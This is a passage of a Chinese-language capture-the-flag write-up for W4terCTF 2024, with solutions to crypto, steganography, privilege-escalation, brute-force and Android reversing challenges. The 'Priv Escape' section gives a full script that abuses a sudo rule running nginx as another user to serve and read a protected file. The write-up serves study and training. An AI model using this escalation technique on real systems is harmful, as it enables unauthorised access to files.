class="symbol">\u01f6</span>21<span class="symbol">\u01f3</span>75<span class="symbol">\u01f3</span>0f<span class="symbol">\u01f9</span>93<span class="symbol">\u01f3</span>75<span class="symbol">\u01f6</span>e9<span class="symbol">\u01f4</span>c2<span class="symbol">\u01f4</span>4c<span class="symbol">\u01f3</span>f9<span class="symbol">\u01f5</span>d2<span class="symbol">\u01f5</span>d2\u0a\u0a\u42\u74\u77\u2c\u20\u74\u68\u65\u20\u6b\u65\u79\u20\u69\u73\u20\u22\u4b\u45\u59\u22</span><br></pre></td></tr></table></figure><p></p><p>把这个放到 https://www.ifreesite.com/unicode/，得到</p><p></p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">You <span class="built_in">like</span> emojis, don<span class="comment">&#x27;t you?</span></span><br><span class="line"></span><br><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅😆🚰📂🌪☺🛩🌏📂🕹🦓🐅🍵🎈😀🔄🚫🎤🦓✅📮🎤🎅🍎🙃🌉🎃🍍🍴👣🚹🤣🐘🏹☺👣💧👣🦓🌿⌨🌪🌏🙃🍵❓☂🌉😆🏹🍵💧🎅👉🌊🚹🚪🍴😎🎃🌪🙃👁🥋👑💧🐘🎤🥋🐘🛩🤣🌉🛩⏩😍❓🐘😡☀😍🙃😁😀😁🚫📂✅☃🚫😎🔪👑😀🕹🚫😍🌪📂👌🍍👌🦓🖐🤣😎🏎🍍🏹🍌🍍🎤☀🏹🎈🚰💧☀✉🏹🍍🦓🎅🍴☂⏩🚪🐍☺🐘😇😡🍵🌏🦓🍵🛩📂👌🏹🗒🗒</span><br><span class="line"></span><br><span class="line">Btw, the <span class="keyword">key</span> <span class="built_in">is</span> <span class="string">&quot;KEY&quot;</span></span><br></pre></td></tr></table></figure><p></p><p>使用 https://aghorler.github.io/emoji-aes/</p><p>key = 🔑, 得到</p><p></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x???? ⊕ dxBUQVJndGJbbGByE3tGUW57VxV0bH9db3FSe2YFUndUexVUYWl<span class="regexp">/QW1FAW1/</span>bW57EhQSEF0=</span><br></pre></td></tr></table></figure><p></p><p>进行 base64 解码</p><p><img data-src="https://s2.loli.net/2024/04/29/NcwrtAGylDIOVU9.png" alt="spam2024"></p><p>做异或操作，可以猜测开头就是 <code>W4</code></p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="comment"># base64解码后的数据</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(s)&gt;<span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">    arr = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        arr.append(<span class="built_in">ord</span>(x))</span><br><span class="line">    <span class="built_in">print</span>(arr)</span><br><span class="line">    h = <span class="built_in">ord</span>(s[<span class="number">0</span>])^<span class="built_in">ord</span>(<span class="string">&#x27;W&#x27;</span>)</span><br><span class="line">    l = <span class="built_in">ord</span>(s[<span class="number">1</span>])^<span class="built_in">ord</span>(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(arr):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            arr[i] = arr[i]^h</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            arr[i] = arr[i]^l</span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> arr:</span><br><span class="line">        ret += <span class="built_in">chr</span>(x)</span><br><span class="line">    <span class="built_in">print</span>(ret)</span><br><span class="line">    s=s[<span class="number">1</span>:<span class="built_in">len</span>(s)]</span><br></pre></td></tr></table></figure><p></p><p>得到:</p><p><code>W4terCTF&#123;H@V3_fuN_w1TH_yOUr_F!rSt_5pAM_eMa!I_IN_2024&#125;</code></p><h2 id="gzgpt"><a class="anchor" href="#gzgpt">#</a> GZGPT</h2><p>这里漏出鸡脚了：</p><p><img data-src="https://s2.loli.net/2024/04/29/BWxuKC4v8Zzc3bj.png" alt="鸡脚"></p><p>于是分析每一行的末尾：</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.log&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line"></span><br><span class="line">tails = [line[-<span class="number">9</span>:-<span class="number">1</span>] <span class="keyword">for</span> line <span class="keyword">in</span> lines]</span><br><span class="line">tails = [tail <span class="keyword">for</span> tail <span class="keyword">in</span> tails <span class="keyword">if</span> tail[-<span class="number">1</span>] <span class="keyword">in</span> (<span class="string">&#x27;\u200c&#x27;</span>, <span class="string">&#x27;\u200d&#x27;</span>)]</span><br><span class="line">tails[:<span class="number">10</span>]</span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;<span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200d</span><span class="character">\u200d</span>&#x27;<span class="punctuation">,</span></span><br><span class="line"> &#x27;<span class="character">\u200c</span><span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200c</span>&#x27;<span class="punctuation">,</span></span><br><span class="line"> &#x27;<span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200d</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200c</span>&#x27;<span class="punctuation">,</span></span><br><span class="line"> &#x27;<span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200d</span>&#x27;<span class="punctuation">,</span></span><br><span class="line"> &#x27;<span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200d</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200c</span>&#x27;<span class="punctuation">,</span></span><br><span class="line"> &#x27;<span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200c</span><span class="character">\u200c</span><span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200d</span>&#x27;<span class="punctuation">,</span></span><br><span class="line"> &#x27;<span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200c</span>&#x27;<span class="punctuation">,</span></span><br><span class="line"> &#x27;<span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200c</span><span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200d</span><span class="character">\u200c</span>&#x27;<span class="punctuation">,</span></span><br><span class="line"> &#x27;<span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200d</span><span class="character">\u200d</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200d</span>&#x27;<span class="punctuation">,</span></span><br><span class="line"> &#x27;<span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200c</span><span class="character">\u200d</span><span class="character">\u200c</span><span class="character">\u200c</span><span class="character">\u200d</span>&#x27;]</span><br></pre></td></tr></table></figure><p></p><p>可以看到有一些行的末尾有且仅有 8 个这种不可见字符，不是所有行都有，但是经验证，这样的行的数量每次都是恒定的。</p><p>八位，两种字符，一种当 0 一种当 1 试了试：</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;</span><br><span class="line">    <span class="string">&quot;\u200c&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;\u200d&quot;</span>: <span class="number">1</span>,</span><br><span class="line">&#125;</span><br><span class="line">b_tails = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(d[c]) <span class="keyword">for</span> c <span class="keyword">in</span> tail]), <span class="number">2</span>)) <span class="keyword">for</span> tail <span class="keyword">in</span> tails])</span><br><span class="line">b_tails</span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">W<span class="number">4</span>terCTF&#123;I<span class="symbol">NTRUdER_o1</span>_mY_H<span class="number">3</span>ART_l<span class="symbol">n_APR1</span>l&#125;W<span class="number">4</span>terCTF&#123;I<span class="symbol">NTRUdER_o1</span>_mY_H<span class="number">3</span>ART_l<span class="symbol">n_APR1</span>l&#125;W<span class="number">4</span>terCTF&#123;I<span class="symbol">NTRUdER_o1</span>_mY_H<span class="number">3</span>ART_l<span class="symbol">n_APR1</span></span><br></pre></td></tr></table></figure><p></p><h2 id="priv-escape"><a class="anchor" href="#priv-escape">#</a> Priv Escape</h2><p>首先找 flag ，在 <code>/tmp/flag</code> 找到了，但是没权限读！然后还发现这个文件的 owner 居然不是 <code>root</code> ，而是 <code>r00t</code> （什么高仿 root），这或许就意味着不需要 root 权限也能得到 flag 。</p><p><code>find</code> 查找和 <code>r00t</code> 用户有关的所有文件、目录，会发现 nginx 非常可疑，但这还不够。</p><p>关键切入点在于查看与本用户执行权限相关信息：</p><p></p><figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p></p><p>然后发现 nginx 露出了鸡脚：</p><p></p><figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User W4terCTFPlayer may run the following commands on</span><br><span class="line">        priv-escape-5ee9f22c905b4d86:</span><br><span class="line">    (r00t) NOPASSWD: /usr/sbin/nginx</span><br></pre></td></tr></table></figure><p></p><p>这意味着我们的用户可以以 <code>r00t</code> 的身份运行 nginx ，那么依靠 nginx 的网页我们就能读取 <code>/tmp/flag</code> 。</p><p>直接运行 <code>sudo -u r00t nginx</code> ，虽然启动了 nginx ，但是我们不知道咋访问 <code>/tmp/flag</code> ，因为权限问题也无法将 <code>/tmp/flag</code> 软链接到 <code>/var/www/html</code> ，所以我们搞了个脚本用自己的 nginx 配置：</p><p></p><figure class="highlight shell"><figcaption><span>hack.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cp -rf /etc/nginx /home/W4terCTFPlayer/nginx</span><br><span class="line"></span><br><span class="line">echo &quot;user r00t;</span><br><span class="line">worker_processes auto;</span><br><span class="line">pid /home/W4terCTFPlayer/nginx/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">	worker_connections 768;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">	sendfile on;</span><br><span class="line">	tcp_nopush on;</span><br><span class="line">	types_hash_max_size 2048;</span><br><span class="line"></span><br><span class="line">	include /home/W4terCTFPlayer/nginx/mime.types;</span><br><span class="line">	default_type application/octet-stream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE</span><br><span class="line">	ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">	gzip on;</span><br><span class="line"></span><br><span class="line">	include /home/W4terCTFPlayer/nginx/conf.d/*.conf;</span><br><span class="line">	include /home/W4terCTFPlayer/nginx/sites-enabled/*;</span><br><span class="line">&#125;&quot; &gt; /home/W4terCTFPlayer/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line">rm /home/W4terCTFPlayer/nginx/sites-enabled/default</span><br><span class="line"></span><br><span class="line">echo &quot;server &#123;</span><br><span class="line">	listen 8083 default_server;</span><br><span class="line">	listen [::]:8083 default_server;</span><br><span class="line"></span><br><span class="line">	root /tmp;</span><br><span class="line"></span><br><span class="line">	index index.html index.nginx-debian.html;</span><br><span class="line"></span><br><span class="line">	server_name _;</span><br><span class="line"></span><br><span class="line">	location / &#123;</span><br><span class="line">		try_files $uri $uri/ =404;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;&quot; &gt; /home/W4terCTFPlayer/nginx/sites-enabled/default</span><br><span class="line"></span><br><span class="line">echo &#x27;&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    114514</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;&#x27; &gt; /tmp/index.html</span><br><span class="line"></span><br><span class="line">chmod 777 -R /home/W4terCTFPlayer # 不要忘了给 r00t 我们的文件目录访问权限</span><br><span class="line"></span><br><span class="line">sudo -u r00t nginx -c /home/W4terCTFPlayer/nginx/nginx.conf # 启动nginx</span><br></pre></td></tr></table></figure><p></p><p>然后执行：</p><p></p><figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">We1c0meToW4terCTF2024!</span></span><br><span class="line"></span><br><span class="line">scp -P 64780 hack.sh W4terCTFPlayer@127.0.0.1:/home/W4terCTFPlayer  # 输入一下密码</span><br><span class="line"></span><br><span class="line">ssh W4terCTFPlayer@127.0.0.1 -p 64780  # 输入一下密码</span><br><span class="line"></span><br><span class="line">chmod 777 hack.sh</span><br><span class="line"></span><br><span class="line">./hack.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sudo -u r00t nginx -s reload -c /home/W4terCTFPlayer/nginx/nginx.conf  <span class="comment"># 用来重新加载 nginx 配置文件</span></span></span><br><span class="line"></span><br><span class="line">curl https://127.0.0.1:8083/flag</span><br></pre></td></tr></table></figure><p></p><p>然而中途遇到了阻碍，写 WP 的时候才发现似乎是因为我们写脚本的同学用的 mac 的 shell 导致的，在 echo 的时候将 <code>/home/W4terCTFPlayer/nginx/sites-enabled/default</code> 里的 <code>$uri</code> 当成了环境变量？！然后 nginx 返回 301 ...... 脚本里把 <code>$uri</code> 改成 <code>\$uri</code> 就好了</p><p><code>W4terCTF&#123;eScAp3_THE_BouNdarles_OF_n9lnX_pRIvi1eGeS&#125;</code></p><h1 id="reverse"><a class="anchor" href="#reverse">#</a> Reverse</h1><h2 id="bruteforceme"><a class="anchor" href="#bruteforceme">#</a> BruteforceMe</h2><p>下载的附件是一个程序，运行程序后可以输入 flag，程序会判断 flag 长度是否正确，如果长度正确，会给出 flag 经过加密后经比对有多少字符符合</p><p>所以，只需要一个 python 脚本猜测每一位的字符，脚本如下</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">input_data = <span class="string">&quot;W4terCTF###################################&quot;</span> <span class="comment"># len = 43</span></span><br><span class="line">arr = <span class="built_in">list</span>(input_data)</span><br><span class="line"><span class="built_in">print</span>(arr)</span><br><span class="line">voc = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;_&quot;</span></span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    input_data = <span class="string">&#x27;&#x27;</span>.join(arr)</span><br><span class="line">    command = [<span class="string">&quot;./BruteforceMe&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 作为子进程启动外部程序</span></span><br><span class="line">    process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输入数据到程序的标准输入</span></span><br><span class="line"></span><br><span class="line">    process.stdin.write(input_data)</span><br><span class="line">    process.stdin.flush()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从标准输出读取程序的输出</span></span><br><span class="line">    output_data, _ = process.communicate()</span><br><span class="line">    <span class="comment">#print(output_data)</span></span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(output_data):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> x.isnumeric():</span><br><span class="line">            j=i+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    tmp=[]</span><br><span class="line">    <span class="keyword">while</span> output_data[j].isnumeric():</span><br><span class="line">        tmp.append(output_data[j])</span><br><span class="line">        j+=<span class="number">1</span></span><br><span class="line">    c_num = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(tmp))</span><br><span class="line">    <span class="comment">#print(input_data)</span></span><br><span class="line">    <span class="comment"># 打印输出</span></span><br><span class="line">    <span class="comment">#print(output_data)</span></span><br><span class="line">    <span class="comment">#print(c_num)</span></span><br><span class="line">    <span class="keyword">return</span> c_num</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">while</span> get_flag() &lt; <span class="number">60</span>:</span><br><span class="line">    <span class="comment"># 随机打乱voc</span></span><br><span class="line">    voc = <span class="built_in">list</span>(voc)</span><br><span class="line">    random.shuffle(voc)</span><br><span class="line">    voc = <span class="string">&#x27;&#x27;</span>.join(voc)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">43</span>):</span><br><span class="line">        old = get_flag()</span><br><span class="line">        <span class="comment">#print(f&quot;&#123;t&#125;,&#123;old&#125;: &quot;)</span></span><br><span class="line">        cur_best = old</span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> voc:</span><br><span class="line">            old_arr = arr[t]</span><br><span class="line">            arr[t]=v</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(arr))</span><br><span class="line">            new = get_flag()</span><br><span class="line">            arr[t]=old_arr</span><br><span class="line">            <span class="keyword">if</span> new &gt;= cur_best:</span><br><span class="line">                <span class="comment">#print(f&quot;&#123;v&#125;,&#123;new&#125;;&quot;,end=&#x27; &#x27;)</span></span><br><span class="line">                arr[t]=v</span><br><span class="line">                cur_best = new</span><br><span class="line">        <span class="comment">#print(&#x27;&#x27;)</span></span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;best: <span class="subst">&#123;get_flag()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(arr))</span><br></pre></td></tr></table></figure><p></p><p>在和 BruteforceMe 同文件夹下执行这个脚本，直到程序遇到报错停止，最后一个输出就是 flag</p><p>一般 while 循环执行 3 轮就能得到结果，运行时间 1 分钟以内</p><p><code>W4terCTF&#123;UnR3IAtED_8y73S_CAN_6e_3nUmErAT3d&#125;</code></p><h2 id="安安又卓卓"><a class="anchor" href="#安安又卓卓">#</a> 安安又卓卓</h2><h3 id="第一问剪刀石头布"><a class="anchor" href="#第一问剪刀石头布">#</a> 第一问：剪刀石头布</h3><p>这一问可以使用 APKTool 进行逆向</p><p>用法参考 https://juejin.cn/post/7216968724938195001</p><p>可以得到反编译的 Smali 代码</p><p>在 <code>smali\com\w4ter\w4terctf2024\FirstChall.smali</code> 中找到以下代码</p><p></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">:array_0</span><br><span class="line"><span class="keyword">    .array</span>-data 2</span><br><span class="line">        0x32s</span><br><span class="line">        0x33s</span><br><span class="line">        0x32s</span><br><span class="line">        0x32s</span><br><span class="line">        0x32s</span><br><span class="line">        0x32s</span><br><span class="line">        0x32s</span><br><span class="line">        0x33s</span><br><span class="line">        0x32s</span><br><span class="line">        0x31s</span><br><span class="line">        0x31s</span><br><span class="line">        0x32s</span><br><span class="line">        0x31s</span><br><span class="line">        0x31s</span><br><span class="line">        0x31s</span><br><span class="line">        0x32s</span><br><span class="line">        0x32s</span><br><span class="line">        0x33s</span><br><span class="line">        0x31s</span><br><span class="line">        0x32s</span><br><span class="line"><span class="keyword">        .</span>.....</span><br></pre></td></tr></table></figure><p></p><p>经验证，这是机器的出拳顺序</p><p>要想赢得机器，对手出 2，我出 1，对手出 3，我出 2，对手出 1，我出 3。</p><p>运行下面的脚本，得到我方出拳顺序</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rival=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span 